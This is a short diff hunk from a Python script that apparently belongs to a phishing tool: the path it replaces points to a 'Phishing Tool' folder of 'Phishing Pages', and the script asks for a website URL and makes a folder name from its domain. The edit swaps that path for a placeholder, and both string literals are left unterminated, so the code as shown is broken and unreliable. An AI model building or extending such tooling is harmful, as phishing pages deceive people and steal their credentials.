@@ -66,7 +66,7 @@ print_banner()
 # Custom intro with website URL
 url = input(f"{Fore.BLUE}╔═══[Website URL] \n╚══> {Fore.WHITE}")
 
-base_folder = r"C:\Users\Nut\Desktop\Tool\Phishing\oPo Phishing Tool\Phishing Pages
+base_folder = r"C:\you folder
 
 domain_name = urlparse(url).netloc
 clean_name = re.sub(r'[^\w\-_\. ]', '_', domain_name)
